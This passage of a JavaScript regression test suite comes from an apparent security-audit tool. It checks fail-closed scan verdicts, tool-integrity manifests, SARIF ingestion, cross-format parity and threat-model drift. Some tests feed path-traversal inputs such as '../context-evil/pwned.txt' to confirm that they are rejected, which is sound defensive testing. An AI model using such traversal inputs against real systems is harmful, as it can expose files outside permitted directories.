  if (toolViolationScan.summary.canDeclareClean !== false || toolViolationScan.summary.toolIntegrity.status !== 'TCB_OVERLAP') {
    throw new Error('R6-P0-01 VIOLATION: Tool integrity TCB_OVERLAP did not fail closed on canDeclareClean');
  }

  // 78.4 COMPLETE_DECLARED + valid context + valid tool + 0 findings => canDeclareClean: true (R6-P0-01)
  const cleanDeclaredScan = finalizeScan({
    candidates: [],
    manifest: fullManifest78,
    repoRoot: process.cwd(),
    auditIntent: 'REGRESSION',
    allowSelfAudit: true,
    capabilities: {
      required: ['repository.read'],
      observed: [],
      forbidden: ['filesystem.write'],
      status: 'DECLARED',
      attestationConfidence: 'DECLARED',
      observationSource: 'agent-manifest-declaration'
    }
  });
  if (!cleanDeclaredScan.summary.canDeclareClean || cleanDeclaredScan.summary.execution.verdict !== 'COMPLETE_DECLARED') {
    throw new Error('R6-P0-01 VIOLATION: Complete declared run with zero findings failed canDeclareClean');
  }

  // 78.5 COMPLETE_VERIFIED + valid context + valid tool + 0 findings => canDeclareClean: true (R6-P0-01)
  const cleanVerifiedScan = finalizeScan({
    candidates: [],
    manifest: fullManifest78,
    repoRoot: process.cwd(),
    auditIntent: 'REGRESSION',
    allowSelfAudit: true,
    capabilities: {
      required: ['repository.read'],
      observed: ['repository.read'],
      forbidden: ['filesystem.write'],
      status: 'CONFORMANT',
      attestationConfidence: 'OBSERVED',
      observationSource: 'runtime-telemetry'
    }
  });
  if (!cleanVerifiedScan.summary.canDeclareClean || cleanVerifiedScan.summary.execution.verdict !== 'COMPLETE_VERIFIED') {
    throw new Error('R6-P0-01 VIOLATION: Complete verified run with zero findings failed canDeclareClean');
  }

  // 78.6 R6-P1-01: TCB manifest omission and digest mismatch fail-closed check
  const fakeManifestDir = fs.mkdtempSync(path.join(os.tmpdir(), 'sec-audit-tcb-fake-'));
  try {
    const emptyManifestPath = path.join(fakeManifestDir, 'tool-integrity-manifest.json');
    fs.writeFileSync(emptyManifestPath, JSON.stringify({
      schemaVersion: '1.0.0',
      toolVersion: '1.0.0',
      manifestDigest: '0000',
      criticalScripts: {}
    }), 'utf8');
    const emptyManifestRes = verifyToolSelfIntegrity(fakeManifestDir, process.cwd(), { allowSelfAudit: true });
    if (emptyManifestRes.valid || emptyManifestRes.status !== 'INTEGRITY_VIOLATION') {
      throw new Error('R6-P1-01 VIOLATION: Manifest with empty criticalScripts was accepted as conformant');
    }

    const realManifest = generateToolIntegrityManifest(path.resolve(process.cwd(), 'skills/3lens'));
    const tamperedManifest = { ...realManifest, manifestDigest: 'deadbeef'.repeat(8) };
    fs.writeFileSync(emptyManifestPath, JSON.stringify(tamperedManifest), 'utf8');
    const tamperedDigestRes = verifyToolSelfIntegrity(fakeManifestDir, process.cwd(), { allowSelfAudit: true });
    if (tamperedDigestRes.valid || tamperedDigestRes.status !== 'INTEGRITY_VIOLATION') {
      throw new Error('R6-P1-01 VIOLATION: Manifest with forged manifestDigest was accepted as conformant');
    }
  } finally {
    fs.rmSync(fakeManifestDir, { recursive: true, force: true });
  }

  // 78.7 R6-P1-02: Pathname sniffing removed — path containing 'security-audit' without allowSelfAudit triggers TCB_OVERLAP
  const noSniffScan = finalizeScan({
    candidates: [],
    manifest: fullManifest78,
    repoRoot: process.cwd(),
    allowSelfAudit: false
  });
  if (noSniffScan.summary.toolIntegrity.status !== 'TCB_OVERLAP' || noSniffScan.summary.canDeclareClean) {
    throw new Error('R6-P1-02 VIOLATION: Pathname containing "security-audit" implicitly activated self-audit mode');
  }

  // 78.8 R6-P1-03: Mandated vs Observed context isolation attestation
  if (cleanDeclaredScan.summary.execution.contextIsolation.status !== 'MANDATED' ||
      cleanDeclaredScan.summary.execution.contextIsolation.pipeline !== 'MANDATED_SHADOW_CONTEXT_PIPELINE') {
    throw new Error('R6-P1-03 VIOLATION: Execution attestation failed to record MANDATED context isolation');
  }

  console.log('✔ 78. R6 Invariant: Assurance Gates (canDeclareClean bound to Execution, Context, & Tool Integrity), Fail-Closed Manifest, Explicit Self-Audit, & Mandated Context Isolation.');

  // ---------------------------------------------------------------------------
  // 79. R7-P0-01 Invariant: Strict Path Containment & Sibling Prefix Enclosure
  // ---------------------------------------------------------------------------
  const root79 = path.resolve(process.cwd(), 'scratch/context');
  if (!isPathContained(root79, path.resolve(root79, 'sub/file.txt'))) {
    throw new Error('R7-P0-01 VIOLATION: isPathContained rejected normal nested child path');
  }
  if (!isPathContained(root79, root79)) {
    throw new Error('R7-P0-01 VIOLATION: isPathContained rejected exact root match');
  }
  if (isPathContained(root79, path.resolve(root79, '../outside.txt'))) {
    throw new Error('R7-P0-01 VIOLATION: isPathContained accepted parent directory traversal');
  }
  if (isPathContained(root79, path.resolve(process.cwd(), 'scratch/context-evil/outside.txt'))) {
    throw new Error('R7-P0-01 VIOLATION: isPathContained accepted sibling directory with matching string prefix (context-evil)');
  }
  if (isPathContained(root79, path.resolve(process.cwd(), 'scratch/context_other/file.txt'))) {
    throw new Error('R7-P0-01 VIOLATION: isPathContained accepted sibling directory with matching string prefix (context_other)');
  }

  const prep79 = prepareReviewContext(process.cwd(), {
    targetFiles: ['../outside.txt', '../context-evil/pwned.txt']
  });
  if (prep79.manifest.scannedFilesCount !== 0 || prep79.manifest.preparedFilesCount !== 0) {
    throw new Error('R7-P0-01 VIOLATION: prepareReviewContext accepted traversal/sibling targetFiles');
  }

  const evilCandidate79 = getPreparedContextFilePath(process.cwd(), '../context-evil/file.txt');
  if (evilCandidate79 !== null) {
    throw new Error('R7-P0-01 VIOLATION: getPreparedContextFilePath accepted sibling prefix path');
  }
  console.log('✔ 79. R7 Invariant: Strict Path Containment & Sibling Prefix Enclosure (R7-P0-01).');

  // ---------------------------------------------------------------------------
  // 80. R7-P0-02 Invariant: Cross-Platform SARIF URI Normalization & Granular Evidence Binding Accounting
  // ---------------------------------------------------------------------------
  const winPath80 = 'skills\\3lens\\scripts\\safe-git.mjs';
  const normWin80 = resolveExternalUri(process.cwd(), winPath80);
  if (normWin80 !== 'skills/3lens/scripts/safe-git.mjs') {
    throw new Error(`R7-P0-02 VIOLATION: resolveExternalUri failed to normalize Windows path: ${normWin80}`);
  }
  const pctPath80 = 'skills%5C3lens%5Cscripts%5Csafe-git.mjs';
  const normPct80 = resolveExternalUri(process.cwd(), pctPath80);
  if (normPct80 !== 'skills/3lens/scripts/safe-git.mjs') {
    throw new Error(`R7-P0-02 VIOLATION: resolveExternalUri failed to normalize percent-encoded path: ${normPct80}`);
  }

  const mockSarif80 = {
    version: '2.1.0',
    runs: [
      {
        tool: { driver: { name: 'MockScanner' } },
        results: [
          {
            ruleId: 'MOCK-01',
            message: { text: 'Real finding in source' },
            locations: [{ physicalLocation: { artifactLocation: { uri: 'skills/3lens/scripts/safe-git.mjs' }, region: { startLine: 1 } } }]
          },
          {
            ruleId: 'MOCK-01',
            message: { text: 'Shadow context duplicate finding' },
            locations: [{ physicalLocation: { artifactLocation: { uri: 'scratch/context/skills/3lens/scripts/safe-git.mjs' }, region: { startLine: 1 } } }]
          },
          {
            ruleId: 'MOCK-02',
            message: { text: 'Missing file finding' },
            locations: [{ physicalLocation: { artifactLocation: { uri: 'src/missing-file.js' }, region: { startLine: 1 } } }]
          },
          {
            ruleId: 'MOCK-03',
            message: { text: 'Outside repo traversal' },
            locations: [{ physicalLocation: { artifactLocation: { uri: '../../outside.js' }, region: { startLine: 1 } } }]
          }
        ]
      }
    ]
  };

  const ingested80 = ingestExternalEvidence(mockSarif80, process.cwd());
  if (!ingested80.success) {
    throw new Error(`R7-P0-02 VIOLATION: ingestExternalEvidence failed: ${ingested80.error}`);
  }
  if (ingested80.parsedCount !== 4 || ingested80.canonicalCount !== 3 || ingested80.duplicateGeneratedCount !== 1 || ingested80.boundCount !== 1 || ingested80.unboundCount !== 2) {
    throw new Error(`R7-P0-02 VIOLATION: Ingest metrics mismatch: parsed=${ingested80.parsedCount}, canonical=${ingested80.canonicalCount}, dup=${ingested80.duplicateGeneratedCount}, bound=${ingested80.boundCount}, unbound=${ingested80.unboundCount}`);
  }

  const f1_80 = ingested80.findings.find(f => f.ruleId === 'MOCK-01' && f.evidenceBinding === 'BOUND');
  const fDup80 = ingested80.findings.find(f => f.ruleId === 'MOCK-01' && f.evidenceBinding === 'GENERATED_DUPLICATE');
  const fMiss80 = ingested80.findings.find(f => f.ruleId === 'MOCK-02');
  const fOut80 = ingested80.findings.find(f => f.ruleId === 'MOCK-03');

  if (!f1_80 || !f1_80.evidenceHash) {
    throw new Error('R7-P0-02 VIOLATION: Canonical finding MOCK-01 failed to bind evidenceHash');
  }
  if (!fDup80) {
    throw new Error('R7-P0-02 VIOLATION: Shadow context finding failed to classify as GENERATED_DUPLICATE');
  }
  if (!fMiss80 || fMiss80.evidenceBinding !== 'UNBOUND_MISSING_FILE') {
    throw new Error('R7-P0-02 VIOLATION: Missing file finding failed to classify as UNBOUND_MISSING_FILE');
  }
  if (!fOut80 || fOut80.evidenceBinding !== 'OUTSIDE_SCOPE') {
    throw new Error('R7-P0-02 VIOLATION: Traversal finding failed to classify as OUTSIDE_SCOPE');
  }
  console.log('✔ 80. R7 Invariant: Cross-Platform SARIF URI Normalization & Granular Evidence Binding Accounting (R7-P0-02).');

  // ---------------------------------------------------------------------------
  // 81. R9-T01: Final clean scan atomically sets scan-manifest.complete = true
  // ---------------------------------------------------------------------------
  const m81 = buildScanManifest({ repoRoot: process.cwd() });
  if (m81.complete !== false || m81.completedAt !== null) {
    throw new Error('R9-T01 VIOLATION: Newly built scan-manifest did not initialize with complete: false');
  }
  const cleanFinalized81 = finalizeScan({
    candidates: [],
    manifest: m81,
    repoRoot: process.cwd(),
    auditIntent: 'REGRESSION',
    allowSelfAudit: true
  });
  if (cleanFinalized81.manifest.complete !== true || !cleanFinalized81.manifest.completedAt) {
    throw new Error('R9-T01 VIOLATION: Finalized clean scan did not set complete: true or completedAt');
  }
  console.log('✔ 81. R9-T01 Invariant: Final clean scan atomically sets scan-manifest.complete = true and completedAt.');

  // ---------------------------------------------------------------------------
  // 82. R9-T02: Incomplete scan-manifest cannot declare authoritative clean
  // ---------------------------------------------------------------------------
  const incompleteManifest82 = {
    complete: false,
    completedAt: null,
    canDeclareClean: true
  };
  if (isAuthoritativeClean(incompleteManifest82)) {
    throw new Error('R9-T02 VIOLATION: isAuthoritativeClean allowed incomplete manifest (complete: false) to be authoritative clean');
  }
  console.log('✔ 82. R9-T02 Invariant: Incomplete scan-manifest (complete: false) strictly cannot declare authoritative clean.');

  // ---------------------------------------------------------------------------
  // 83. R9-T03: codeql-db, .semgrep, and coverage classified as EXCLUDED_ANALYSIS_ARTIFACT
  // ---------------------------------------------------------------------------
  const catCodeql = categorizeDirectory('codeql-db');
  const catSemgrep = categorizeDirectory('.semgrep');
  const catCoverage = categorizeDirectory('coverage');
  const fileCodeql = classifyFile('codeql-db/db.json');
  if (catCodeql.status !== 'EXCLUDED_ANALYSIS_ARTIFACT' || catCodeql.kind !== 'EXCLUDED') {
    throw new Error(`R9-T03 VIOLATION: codeql-db categorized as ${catCodeql.status} instead of EXCLUDED_ANALYSIS_ARTIFACT`);
  }
  if (catSemgrep.status !== 'EXCLUDED_ANALYSIS_ARTIFACT') {
    throw new Error(`R9-T03 VIOLATION: .semgrep categorized as ${catSemgrep.status} instead of EXCLUDED_ANALYSIS_ARTIFACT`);
  }
  if (catCoverage.status !== 'EXCLUDED_ANALYSIS_ARTIFACT') {
    throw new Error(`R9-T03 VIOLATION: coverage categorized as ${catCoverage.status} instead of EXCLUDED_ANALYSIS_ARTIFACT`);
  }
  if (fileCodeql.classification !== 'EXCLUDED_ANALYSIS_ARTIFACT' || fileCodeql.isScanned !== false) {
    throw new Error(`R9-T03 VIOLATION: codeql-db/db.json classified as ${fileCodeql.classification} instead of EXCLUDED_ANALYSIS_ARTIFACT`);
  }
  console.log('✔ 83. R9-T03 Invariant: codeql-db and scanner outputs classified as EXCLUDED_ANALYSIS_ARTIFACT.');

  // ---------------------------------------------------------------------------
  // 84. R9-T04: codeql-db not added to model-facing review context
  // ---------------------------------------------------------------------------
  const testRoot84 = fs.mkdtempSync(path.join(os.tmpdir(), 'agy-r9-t04-'));
  try {
    fs.mkdirSync(path.join(testRoot84, 'src'), { recursive: true });
    fs.writeFileSync(path.join(testRoot84, 'src', 'index.js'), 'console.log("hello");\n', 'utf8');
    fs.mkdirSync(path.join(testRoot84, 'codeql-db'), { recursive: true });
    fs.writeFileSync(path.join(testRoot84, 'codeql-db', 'db.xml'), '<db>content</db>\n', 'utf8');

    const prep84 = prepareReviewContext(testRoot84);
    const preparedFiles = prep84.manifest.preparedFiles.map(f => (f.relativePath || f.path || '').replace(/\\/g, '/'));
    if (preparedFiles.some(f => f.includes('codeql-db'))) {
      throw new Error('R9-T04 VIOLATION: codeql-db was prepared into model-facing review context!');
    }
  } finally {
    fs.rmSync(testRoot84, { recursive: true, force: true });
  }
  console.log('✔ 84. R9-T04 Invariant: codeql-db strictly excluded from model-facing review context.');

  // ---------------------------------------------------------------------------
  // 85. R9-T05: SARIF / Markdown / Manifest verdict mismatch fails release parity
  // ---------------------------------------------------------------------------
  const parityMismatch85 = validateCrossFormatParity({
    sarif: { runs: [{ properties: { canDeclareClean: true } }] },
    scanManifest: { canDeclareClean: false }
  });
  if (parityMismatch85.valid) {
    throw new Error('R9-T05 VIOLATION: validateCrossFormatParity accepted verdict mismatch between SARIF and Manifest');
  }
  console.log('✔ 85. R9-T05 Invariant: SARIF / Markdown / Manifest verdict mismatch detected fail-closed.');

  // ---------------------------------------------------------------------------
  // 86. R9-T06: Finding count mismatch fails release parity
  // ---------------------------------------------------------------------------
  const countMismatch86 = validateCrossFormatParity({
    sarif: { runs: [{ properties: { canDeclareClean: false, findingCounts: { reportable: 2, deferred: 0 } } }] },
    scanManifest: { canDeclareClean: false, findingCounts: { reportable: 1, deferred: 0 } }
  });
  if (countMismatch86.valid) {
    throw new Error('R9-T06 VIOLATION: validateCrossFormatParity accepted finding count mismatch');
  }
  console.log('✔ 86. R9-T06 Invariant: Cross-format finding count mismatch detected fail-closed.');

  // ---------------------------------------------------------------------------
  // 87. R9-T07: Coverage status mismatch fails release parity
  // ---------------------------------------------------------------------------
  const covMismatch87 = validateCrossFormatParity({
    sarif: { runs: [{ properties: { coverageStatus: 'COMPLETE' } }] },
    coverage: { coverageStatus: 'PARTIAL' }
  });
  if (covMismatch87.valid) {
    throw new Error('R9-T07 VIOLATION: validateCrossFormatParity accepted coverage status mismatch');
  }
  console.log('✔ 87. R9-T07 Invariant: Cross-format coverage status mismatch detected fail-closed.');

  // ---------------------------------------------------------------------------
  // 88. R9-T08: Generic actor without evidence triggers threat-model quality warning
  // ---------------------------------------------------------------------------
  const mockTm88 = {
    components: [{ id: 'CompA', evidence: ['skills/3lens/scripts/safe-git.mjs'] }],
    actors: [
      { id: 'external-attacker', status: 'ASSUMPTION', source: 'UNKNOWN' }
    ]
  };
  const valTm88 = validateThreatModel(mockTm88, process.cwd());
  if (!valTm88.warnings.some(w => w.includes('GENERIC_ACTOR_WITHOUT_EVIDENCE') || w.includes('generic actor without repository evidence'))) {
    throw new Error('R9-T08 VIOLATION: validateThreatModel failed to emit quality warning for generic unevidenced actor');
  }
  console.log('✔ 88. R9-T08 Invariant: Generic actor without evidence triggers threat-model quality warning.');

  // ---------------------------------------------------------------------------
  // 89. R9-T09: Component without repository evidence cannot become authoritative
  // ---------------------------------------------------------------------------
  const mockTm89 = {
    components: [{ id: 'GhostComponent', evidence: ['missing/nonexistent/file.js'] }],
    actors: []
  };
  const valTm89 = validateThreatModel(mockTm89, process.cwd());
  if (valTm89.valid) {
    throw new Error('R9-T09 VIOLATION: validateThreatModel marked component with nonexistent evidence as valid');
  }
  console.log('✔ 89. R9-T09 Invariant: Component without verified physical evidence fails authoritative validation.');

  // ---------------------------------------------------------------------------
  // 90. R9-T10: Project Security Context absent strictly defaults to CONTEXT_LIMITED
  // ---------------------------------------------------------------------------
  const testRoot90 = fs.mkdtempSync(path.join(os.tmpdir(), 'agy-r9-t10-'));
  try {
    fs.mkdirSync(path.join(testRoot90, 'src'), { recursive: true });
    fs.writeFileSync(path.join(testRoot90, 'src', 'app.js'), 'console.log(1);\n', 'utf8');
    const dirMan90 = buildDirectoryManifest(testRoot90);
    const manifest90 = buildScanManifest({ repoRoot: testRoot90, directoryManifest: dirMan90 });
    const finalized90 = finalizeScan({
      candidates: [],
      manifest: manifest90,
      repoRoot: testRoot90,
      auditIntent: 'REGRESSION'
    });
    if (finalized90.summary.assuranceLabel !== 'CONTEXT_LIMITED') {
      throw new Error(`R9-T10 VIOLATION: Scan without .security-audit/ yielded ${finalized90.summary.assuranceLabel} instead of CONTEXT_LIMITED`);
    }
    // R01-F08 Verification: canDeclareClean must be false when context is limited
    if (finalized90.summary.canDeclareClean !== false) {
      throw new Error(`R9-T10 VIOLATION: canDeclareClean must be strictly false under CONTEXT_LIMITED, got: ${finalized90.summary.canDeclareClean}`);
    }
  } finally {
    fs.rmSync(testRoot90, { recursive: true, force: true });
  }
  console.log('✔ 90. R9-T10 Invariant: Project Security Context absent strictly defaults to CONTEXT_LIMITED assurance.');

  // ---------------------------------------------------------------------------
  // 91. R9-T11: Confirmed Project Security Context eligible for BOUNDED_CLEAN
  // ---------------------------------------------------------------------------
  const tm91 = buildThreatModel(process.cwd());
  if (tm91.contextStatus !== 'CONFIRMED') {
    throw new Error(`R9-T11 VIOLATION: buildThreatModel in repository with .security-audit/ yielded contextStatus: ${tm91.contextStatus}`);
  }
  const finalized91 = finalizeScan({
    candidates: [],
    manifest: buildScanManifest({ repoRoot: process.cwd(), directoryManifest: buildDirectoryManifest(process.cwd()) }),
    repoRoot: process.cwd(),
    threatModel: tm91,
    auditIntent: 'REGRESSION',
    allowSelfAudit: true
  });
  if (finalized91.summary.assuranceLabel !== 'SELF_AUDIT_BOUNDED_CLEAN' && finalized91.summary.assuranceLabel !== 'BOUNDED_CLEAN') {
    throw new Error(`R9-T11 VIOLATION: Confirmed project context failed to achieve BOUNDED_CLEAN: ${finalized91.summary.assuranceLabel}`);
  }
  console.log('✔ 91. R9-T11 Invariant: Confirmed Project Security Context is eligible for BOUNDED_CLEAN assurance.');

  // ---------------------------------------------------------------------------
  // 92. R9-T12: New entrypoint triggers CONTEXT_DRIFT
  // ---------------------------------------------------------------------------
  const baseCtx92 = { project: { entrypoints: ['bin/cli.mjs'] } };
  const currCtx92 = { project: { entrypoints: ['bin/cli.mjs', 'bin/new-entry.mjs'] } };
  const drift92 = detectContextDrift(currCtx92, baseCtx92);
  if (!drift92.hasDrift || drift92.status !== 'CONTEXT_DRIFT') {
    throw new Error(`R9-T12 VIOLATION: New entrypoint did not trigger CONTEXT_DRIFT: ${JSON.stringify(drift92)}`);
  }
  console.log('✔ 92. R9-T12 Invariant: New entrypoint detected and triggers CONTEXT_DRIFT.');

  // ---------------------------------------------------------------------------
  // 93. R9-T13: New privileged operation triggers THREAT_MODEL_REVIEW_REQUIRED
  // ---------------------------------------------------------------------------
  const baseCtx93 = { project: { privilegedOperations: ['read-config'] } };
  const currCtx93 = { project: { privilegedOperations: ['read-config', 'sudo-system-exec'] } };
  const drift93 = detectContextDrift(currCtx93, baseCtx93);
  if (!drift93.hasDrift || drift93.status !== 'THREAT_MODEL_REVIEW_REQUIRED') {
    throw new Error(`R9-T13 VIOLATION: New privileged operation did not trigger THREAT_MODEL_REVIEW_REQUIRED: ${JSON.stringify(drift93)}`);
  }
  console.log('✔ 93. R9-T13 Invariant: New privileged operation triggers THREAT_MODEL_REVIEW_REQUIRED.');

  // ---------------------------------------------------------------------------
  // 94. R9-T14: Stable projectContextFingerprint across runs
  // ---------------------------------------------------------------------------
  const ctxA94 = { project: { projectId: 'p1', languages: ['JS'] }, actors: [{ id: 'a1', trustLevel: 'untrusted' }] };
  const ctxB94 = { project: { projectId: 'p1', languages: ['JS'] }, actors: [{ id: 'a1', trustLevel: 'untrusted' }] };
  const fpA94 = computeProjectContextFingerprint(ctxA94);
  const fpB94 = computeProjectContextFingerprint(ctxB94);
  if (!fpA94 || fpA94 !== fpB94) {
    throw new Error('R9-T14 VIOLATION: computeProjectContextFingerprint is not deterministic across identical contexts');
  }
  console.log('✔ 94. R9-T14 Invariant: Project Context Fingerprint is deterministic and line-shift invariant.');

  // ---------------------------------------------------------------------------
  // 95. R9-T15: Different projectId prevents artifact identity collision
  // ---------------------------------------------------------------------------
  const m95_1 = buildScanManifest({ repoRoot: process.cwd() });
  m95_1.projectId = 'agy-plugin-cc';
  const m95_2 = buildScanManifest({ repoRoot: process.cwd() });
  m95_2.projectId = 'security-audit';

  const name1 = `security-audit-${m95_1.projectId}-HEAD-${m95_1.scanRunId}.sarif`;
  const name2 = `security-audit-${m95_2.projectId}-HEAD-${m95_2.scanRunId}.sarif`;
  if (name1 === name2) {
    throw new Error('R9-T15 VIOLATION: Artifact names collided across different projects!');
  }
  console.log('✔ 95. R9-T15 Invariant: Distinct projectIds produce non-colliding artifact identities.');

  // ---------------------------------------------------------------------------
  // 96. R10-P0-01: Execution stages accounting verifies physical artifacts (no stage spoofing)
  // ---------------------------------------------------------------------------
  const spoofedFinalization = finalizeScan({
    candidates: [],
    manifest: null,
    threatModel: null,
    discoveryMatrix: [],
    votes: [],
    executedStages: ['INVENTORY', 'THREAT_MODELING', 'DISCOVERY_MATRIX', 'VERIFICATION_PANEL', 'FINALIZATION'],
    repoRoot: process.cwd()
  });
  if (spoofedFinalization.summary.execution.stagesComplete === true ||
      spoofedFinalization.summary.execution.verdict !== 'DEGRADED') {
    throw new Error('R10-P0-01 VIOLATION: finalizeScan allowed spoofed stages without physical artifacts!');
  }
  console.log('✔ 96. R10-P0-01 Invariant: Execution attestation verifies physical artifacts and rejects spoofed stages under Default-Deny.');

  // ---------------------------------------------------------------------------
  // 97. R10-P0-02: validateCrossFormatParity enforces consistency across objects and file paths
  // ---------------------------------------------------------------------------
  const tmpDir97 = fs.mkdtempSync(path.join(os.tmpdir(), 'sec-audit-r10-parity-'));
  try {
    const sarifPath97 = path.join(tmpDir97, 'report.sarif');
    const mdPath97 = path.join(tmpDir97, 'report.md');
    const manifestPath97 = path.join(tmpDir97, 'manifest.json');
    const covPath97 = path.join(tmpDir97, 'coverage.json');

    fs.writeFileSync(sarifPath97, JSON.stringify({ runs: [{ properties: { canDeclareClean: true, coverageStatus: 'COMPLETE' } }] }), 'utf8');
    fs.writeFileSync(mdPath97, '# Security Audit Report\n- **Can Declare Clean**: **true**\n- **Confirmed Vulnerabilities (Reportable)**: 0\n', 'utf8');
    fs.writeFileSync(manifestPath97, JSON.stringify({ canDeclareClean: true, coverageStatus: 'COMPLETE' }), 'utf8');
    fs.writeFileSync(covPath97, JSON.stringify({ coverageStatus: 'COMPLETE' }), 'utf8');

    const parityOk = validateCrossFormatParity({
      sarifPath: sarifPath97,
      markdownPath: mdPath97,
      manifestPath: manifestPath97,
      coveragePath: covPath97
    });
    if (!parityOk.valid) {
      throw new Error(`R10-P0-02 VIOLATION: validateCrossFormatParity failed on valid matching file paths: ${parityOk.errors.join(', ')}`);
    }

    fs.writeFileSync(mdPath97, '# Security Audit Report\n- **Can Declare Clean**: **false**\n- **Confirmed Vulnerabilities (Reportable)**: 0\n', 'utf8');
    const parityFail = validateCrossFormatParity({
      sarifPath: sarifPath97,
      markdownPath: mdPath97,
      manifestPath: manifestPath97
    });
    if (parityFail.valid) {
      throw new Error('R10-P0-02 VIOLATION: validateCrossFormatParity accepted contradictory verdicts on disk!');
    }
  } finally {
    fs.rmSync(tmpDir97, { recursive: true, force: true });
  }
  console.log('✔ 97. R10-P0-02 Invariant: Cross-format parity validation enforces consistency across objects and file paths fail-closed.');

  // ---------------------------------------------------------------------------
  // 98. R10-P0-02: computeCanonicalArtifactHashes computes SHA-256 hashes across objects and file paths
  // ---------------------------------------------------------------------------
  const tmpDir98 = fs.mkdtempSync(path.join(os.tmpdir(), 'sec-audit-r10-hashes-'));
  try {
    const filePath98 = path.join(tmpDir98, 'canonical.json');
    const testContent = [{ id: 'TEST-HASH', ruleId: 'CWE-89' }];
    fs.writeFileSync(filePath98, JSON.stringify(testContent), 'utf8');

    const hashesFromPath = computeCanonicalArtifactHashes({ canonicalPath: filePath98 });
    const hashesFromData = computeCanonicalArtifactHashes({ canonicalResult: JSON.stringify(testContent) });

    if (!hashesFromPath.canonicalResultHash || hashesFromPath.canonicalResultHash !== hashesFromData.canonicalResultHash) {
      throw new Error(`R10-P0-02 VIOLATION: computeCanonicalArtifactHashes did not produce matching hash: path=${hashesFromPath.canonicalResultHash}, data=${hashesFromData.canonicalResultHash}`);
    }
  } finally {
    fs.rmSync(tmpDir98, { recursive: true, force: true });
  }
  console.log('✔ 98. R10-P0-02 Invariant: computeCanonicalArtifactHashes computes deterministic SHA-256 hashes across objects and file paths.');

  // ---------------------------------------------------------------------------
  // 99. R10-P1-01: Sparse Component x Applicable Family Matrix filtering
  // ---------------------------------------------------------------------------
  const comp99 = [
    {
      id: 'Inventory',
      name: 'Inventory',
      applicableFamilies: ['filesystem/path/archive', 'state/business-logic'],
      notApplicable: {
        'auth/authz/tenancy': 'Local filesystem only; tenancy not applicable'
      }
    }
  ];
  const families99 = ['filesystem/path/archive', 'auth/authz/tenancy', 'network/SSRF'];
  const matrix99 = generateDiscoveryMatrix(comp99, families99);
  const cellApp = matrix99.find(c => c.family === 'filesystem/path/archive');
  const cellNotAppExplicit = matrix99.find(c => c.family === 'auth/authz/tenancy');
  const cellNotAppImplicit = matrix99.find(c => c.family === 'network/SSRF');

  if (!cellApp || cellApp.status !== 'PENDING') {
    throw new Error(`R10-P1-01 VIOLATION: Applicable cell was not PENDING: ${cellApp?.status}`);
  }
  if (!cellNotAppExplicit || cellNotAppExplicit.status !== 'NOT_APPLICABLE' || !cellNotAppExplicit.reason.includes('Local filesystem only')) {
    throw new Error(`R10-P1-01 VIOLATION: notApplicable cell failed with status=${cellNotAppExplicit?.status}, reason=${cellNotAppExplicit?.reason}`);
  }
  if (!cellNotAppImplicit || cellNotAppImplicit.status !== 'NOT_APPLICABLE' || !cellNotAppImplicit.reason.includes('outside defined architectural scope')) {
    throw new Error(`R10-P1-01 VIOLATION: Implicitly excluded family was not marked NOT_APPLICABLE: ${cellNotAppImplicit?.status}`);
  }
  console.log('✔ 99. R10-P1-01 Invariant: Sparse matrix filters non-applicable families with explicit architectural rationale.');

  // ---------------------------------------------------------------------------
  // 100. R10-P1-02: Confirmed Project Context is authoritative and quarantines unconfirmed items
  // ---------------------------------------------------------------------------
  const tm100 = buildThreatModel(process.cwd());
  if (tm100.contextStatus !== 'CONFIRMED') {
    throw new Error(`R10-P1-02 VIOLATION: Expected CONFIRMED contextStatus, got ${tm100.contextStatus}`);
  }
  if (!tm100.suggestedExtensions || !Array.isArray(tm100.suggestedExtensions.components)) {
    throw new Error('R10-P1-02 VIOLATION: suggestedExtensions missing or not structured in confirmed threat model');
  }
  for (const comp of tm100.suggestedExtensions.components) {
    if (comp.status !== 'AUTO_DISCOVERED_UNCONFIRMED') {
      throw new Error(`R10-P1-02 VIOLATION: Quarantined component lacks AUTO_DISCOVERED_UNCONFIRMED status: ${JSON.stringify(comp)}`);
    }
  }
  console.log('✔ 100. R10-P1-02 Invariant: Confirmed Project Context is authoritative; auto-discovered items are quarantined in suggestedExtensions.');

  // ---------------------------------------------------------------------------
  // 101. R10-P1-03: Baseline context persistence and drift enforcement
  // ---------------------------------------------------------------------------
  const tmpDir101 = fs.mkdtempSync(path.join(os.tmpdir(), 'sec-audit-r10-baseline-'));
  try {
    const baseObj101 = { projectId: 'test-p101', entrypoints: ['index.js'] };
    const persistRes = persistBaselineContext(tmpDir101, baseObj101);
    if (!persistRes.success || !fs.existsSync(persistRes.path)) {
      throw new Error(`R10-P1-03 VIOLATION: persistBaselineContext failed: ${JSON.stringify(persistRes)}`);
    }
    const loadRes = loadBaselineContext(tmpDir101);
    if (!loadRes.exists || loadRes.baseline?.projectId !== 'test-p101') {
      throw new Error(`R10-P1-03 VIOLATION: loadBaselineContext returned invalid baseline: ${JSON.stringify(loadRes)}`);
    }
  } finally {
    fs.rmSync(tmpDir101, { recursive: true, force: true });
  }
  console.log('✔ 101. R10-P1-03 Invariant: Baseline context persistence and retrieval operate cleanly.');

  // ---------------------------------------------------------------------------
  // 102. R10-P1-04: Inventory-driven initProjectContext discovers deterministic facts
  // ---------------------------------------------------------------------------
  const tmpDir102 = fs.mkdtempSync(path.join(os.tmpdir(), 'sec-audit-r10-init-'));
  try {
    fs.writeFileSync(path.join(tmpDir102, 'web.config'), '<configuration></configuration>', 'utf8');
    fs.writeFileSync(path.join(tmpDir102, 'Default.aspx'), '<%@ Page %>', 'utf8');
    fs.writeFileSync(path.join(tmpDir102, 'Default.aspx.cs'), 'public partial class _Default {}', 'utf8');

    const initRes = initProjectContext(tmpDir102);
    if (!initRes.success) {
      throw new Error(`R10-P1-04 VIOLATION: initProjectContext failed: ${JSON.stringify(initRes)}`);
    }
    const proj102 = JSON.parse(fs.readFileSync(path.join(tmpDir102, '.security-audit', 'project.json'), 'utf8'));
    if (!proj102.languages.includes('C#') || !proj102.runtime.includes('.NET Framework / IIS')) {
      throw new Error(`R10-P1-04 VIOLATION: initProjectContext failed to detect ASP.NET WebForms: ${JSON.stringify(proj102)}`);
    }
  } finally {
    fs.rmSync(tmpDir102, { recursive: true, force: true });
  }
  console.log('✔ 102. R10-P1-04 Invariant: Inventory-driven initProjectContext accurately detects language, framework, and entrypoints.');

  // ---------------------------------------------------------------------------
  // 103. R10-P1-05: projectId identity precedence (USER_CONFIRMED context > manifest > package.json > basename)
  // ---------------------------------------------------------------------------
